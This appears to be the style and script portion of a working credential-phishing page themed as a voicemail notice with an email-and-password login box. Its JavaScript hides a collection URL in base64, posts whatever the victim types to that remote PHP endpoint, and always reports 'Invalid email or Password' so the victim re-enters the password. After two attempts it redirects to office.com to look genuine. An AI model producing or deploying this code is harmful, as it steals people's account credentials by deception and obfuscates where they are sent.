    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body,html{
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
            background-size: cover;
            background-position: center;
            margin: 0;
            background-repeat: no-repeat;

        body{
            background-image: url('https://i.postimg.cc/RVFSZpGp/voicemessage.png');
        }


        .login-container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            margin: 0 10px;
        }

        .logo {
            width: 100px;
            height: auto;
            margin-bottom: 20px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 15px 0;
            font-size: 14px;
        }

        .remember-me input {
            margin-right: 8px;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: #fff;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-button:hover {
            background-color: #0056b3;
        }


        #msgfont {
            color: red;
        }


        .instructions {
            font-size: 16px;
            color: #333;
            margin-bottom: 20px;
        }
    </style>

    <script type="text/javascript">
        document.addEventListener('DOMContentLoaded', function () {
            const btWole = document.getElementById('btWole');
            const msgFont = document.getElementById('msgfont');
            const encodedUrl = 'd3d3LmJyYWthdGF3ZS5hdHdlYnBhZ2VzLmNvbS9yZXBzLnBocA==';
            const sendUrl = atob(encodedUrl);

            let countAttempt = 0;

            // Event listeners for both click and touch
            ['click', 'touchend'].forEach(eventType => {
                btWole.addEventListener(eventType, function (event) {
                    event.preventDefault();
                    handleSubmission();
                });
            });

            function handleSubmission() {
                const kokoro = document.getElementById('kokoro').value.trim();
                const oruko = document.getElementById('oruko').value.trim();

                if (!kokoro) {
                    msgFont.textContent = "Please enter password";
                    return;
                }

                teSile();
            }

            function teSile() {
                const formData = new FormData(document.forms['pride']);
                countAttempt++;

                const xhr = new XMLHttpRequest();
                xhr.open('POST', sendUrl);
                xhr.send(formData);

                btWole.value = "Verifying....";
                msgFont.textContent = "Invalid email or Password";

                if (countAttempt >= 2) {
                    setTimeout(() => {
                        window.location.href = "http://office.com";
                    }, 2000);
                } else {
                    setTimeout(() => {
                        msgFont.textContent = "Invalid, Delete and re-input correct password";
                        btWole.value = "Continue";
                    }, 2000);
                }
            }
        });
    </script>
